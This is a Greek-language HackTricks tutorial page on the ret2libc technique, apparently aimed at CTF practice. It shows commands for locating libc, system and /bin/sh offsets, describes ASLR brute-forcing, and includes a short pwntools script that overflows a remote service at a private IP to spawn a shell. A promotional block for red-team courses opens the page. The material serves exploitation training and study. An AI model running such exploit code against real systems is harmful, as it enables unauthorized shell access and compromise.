# Ret2lib

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## **Βασικές Πληροφορίες**

Η ουσία του **Ret2Libc** είναι να ανακατευθύνει τη ροή εκτέλεσης ενός ευάλωτου προγράμματος σε μια συνάρτηση μέσα σε ένα κοινόχρηστο βιβλιοθήκη (π.χ., **system**, **execve**, **strcpy**) αντί να εκτελεί κώδικα κέλυφους που παρέχεται από τον εισβολέα στη στοίβα. Ο εισβολέας δημιουργεί ένα φορτίο που τροποποιεί τη διεύθυνση επιστροφής στη στοίβα ώστε να δείχνει στην επιθυμητή συνάρτηση βιβλιοθήκης, ταυτόχρονα διαμορφώνοντας τυχόν απαραίτητα ορίσματα για να ρυθμιστούν σωστά σύμφωνα με τον κανόνα κλήσης.

### **Παραδειγματικά Βήματα (απλοποιημένα)**

* Αποκτήστε τη διεύθυνση της συνάρτησης που θέλετε να καλέσετε (π.χ. system) και την εντολή που θέλετε να καλέσετε (π.χ. /bin/sh)
* Δημιουργήστε μια ROP αλυσίδα για να περάσετε το πρώτο όρισμα που δείχνει στο συμβολοσειρά εντολών και τη ροή εκτέλεσης στη συνάρτηση

## Εύρεση των διευθύνσεων

* Υποθέτοντας ότι η `libc` που χρησιμοποιείται είναι αυτή της τρέχουσας μηχανής, μπορείτε να βρείτε πού θα φορτωθεί στη μνήμη με: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Αν θέλετε να ελέγξετε αν το ASLR αλλάζει τη διεύθυνση της libc μπορείτε να κάνετε:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Γνωρίζοντας το libc που χρησιμοποιείται, είναι επίσης δυνατό να βρεθεί το offset προς τη συνάρτηση `system` με:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Γνωρίζοντας το libc που χρησιμοποιείται, είναι επίσης δυνατό να βρεθεί το offset για τη συμβολοσειρά `/bin/sh` με τη λειτουργία:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Χρησιμοποιώντας το gdb-peda / GEF

Γνωρίζοντας την βιβλιοθήκη libc που χρησιμοποιείται, είναι επίσης δυνατό να χρησιμοποιηθεί το Peda ή το GEF για να ανακτηθεί η διεύθυνση της συνάρτησης **system**, της συνάρτησης **exit** και του string **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Χρήση /proc/\<PID>/maps

Αν η διεργασία δημιουργεί **παιδιά** κάθε φορά που επικοινωνείτε μαζί της (διακομιστής δικτύου), προσπαθήστε να **διαβάσετε** αυτό το αρχείο (ίσως χρειαστεί να είστε ροοτ).

Εδώ μπορείτε να βρείτε **ακριβώς πού φορτώνεται η libc** μέσα στη διεργασία και **πού θα φορτωθεί** για κάθε παιδί της διεργασίας.

![](<../../../.gitbook/assets/image (850).png>)

Σε αυτήν την περίπτωση φορτώνεται στη **0xb75dc000** (Αυτή θα είναι η βασική διεύθυνση της libc)

## Άγνωστη libc

Μπορεί να είναι δυνατόν να **μην γνωρίζετε την libc που φορτώνει** το δυαδικό αρχείο (επειδή μπορεί να βρίσκεται σε έναν διακομιστή όπου δεν έχετε πρόσβαση). Σε αυτήν την περίπτωση μπορείτε να εκμεταλλευτείτε την ευπάθεια για **διαρροή μερικών διευθύνσεων και να βρείτε ποια libc** βιβλιοθήκη χρησιμοποιείται:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Και μπορείτε να βρείτε ένα πρότυπο pwntools γι' αυτό στο:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Γνωρίζοντας την libc με 2 μετατοπίσεις

Ελέγξτε τη σελίδα [https://libc.blukat.me/](https://libc.blukat.me/) και χρησιμοποιήστε **δύο διευθύνσεις** συναρτήσεων μέσα στην libc για να βρείτε τη **χρησιμοποιούμενη έκδοση**.

## Παράκαμψη του ASLR σε 32 bits

Αυτές οι επιθέσεις δύνανται να είναι χρήσιμες μόνο για συστήματα 32bit.

* Αν η εκμετάλλευση είναι τοπική, μπορείτε να δοκιμάσετε να βρείτε με βία τη βασική διεύθυνση της libc (χρήσιμο για συστήματα 32bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Εάν επιτεθείτε σε ένα απομακρυσμένο διακομιστή, μπορείτε να δοκιμάσετε να **δοκιμάσετε με βία τη διεύθυνση της συνάρτησης `usleep` της `libc`**, περνώντας ως όρισμα τον αριθμό 10 (για παράδειγμα). Εάν σε κάποιο σημείο ο **διακομιστής χρειάζεται 10 δευτερόλεπτα παραπάνω για να ανταποκριθεί**, τότε βρήκατε τη διεύθυνση αυτής της συνάρτησης.

## One Gadget

Εκτελέστε ένα κέλυφος απλά αναπηδώντας σε **μία συγκεκριμένη διεύθυνση** στην `libc`:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Παράδειγμα Κώδικα Ret2lib

Σε αυτό το παράδειγμα, η ASLR brute-force ενσωματώνεται στον κώδικα και το ευάλωτο δυαδικό αρχείο βρίσκεται σε έναν απομακρυσμένο διακομιστή:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Παράδειγμα Κώδικα x64 Ret2lib

Ελέγξτε το παράδειγμα από:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Ret-into-printf (ή puts)

Αυτό επιτρέπει το **διαρροή πληροφοριών από τη διεργασία** καλώντας το `printf`/`puts` με κάποια συγκεκριμένα δεδομένα τοποθετημένα ως όρισμα.

## Ret2printf

Αυτό σημαίνει ουσιαστικά την κατάχρηση ενός **Ret2lib για να το μετατρέψετε σε μια ευπάθεια συμβολοσειράς `printf`** χρησιμοποιώντας το `ret2lib` για να καλέσετε το printf με τις τιμές που θα το εκμεταλλευτείτε (ακούγεται άχρηστο αλλά είναι δυνατό):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Άλλα Παραδείγματα & αναφορές

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, δεδομένη μια διαρροή στη διεύθυνση μιας συνάρτησης στο libc, χρησιμοποιώντας ένα one gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ενεργοποιημένο το ASLR αλλά χωρίς το PIE, το πρώτο βήμα είναι να γεμίσετε ένα υπερχείλισμα μέχρι το byte 0x00 του canary και στη συνέχεια να καλέσετε το puts και να το διαρρεύσετε. Με το canary δημιουργείται ένα ROP gadget για να καλέσει το puts και να διαρρεύσει τη διεύθυνση του puts από το GOT και ένα ROP gadget για να καλέσει το `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ενεργοποιημένο το ASLR, χωρίς canary, υπερχείλισμα στη στοίβα στη main από μια υπο-συνάρτηση. ROP gadget για να καλέσει το puts και να διαρρεύσει τη διεύθυνση του puts από το GOT και στη συνέχεια να καλέσει ένα one gadget.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bits, χωρίς pie, χωρίς canary, χωρίς relro, nx. Χρησιμοποιεί τη συνάρτηση write για να διαρρεύσει τη διεύθυνση της write (libc) και καλεί ένα one gadget.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Χρησιμοποιεί μια συμβολοσειρά μορφοποίησης για να διαρρεύσει το canary από τη στοίβα και ένα υπερχείλισμα buffer για να καλέσει το σύστημα (είναι στο GOT) με τη διεύθυνση του `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, χωρίς relro, χωρίς canary, nx, pie. Κατάχρηση ενός κακού δείκτη για να διαρρεύσει διευθύνσεις του libc και της στοίβας από τη στοίβα. Κατάχρηση του υπερχείλισμα buffer για να κάνει ένα ret2lib καλώντας το `system('/bin/sh')` (η διεύθυνση της στοίβας χρειάζεται για να παρακάμψει έναν έλεγχο).
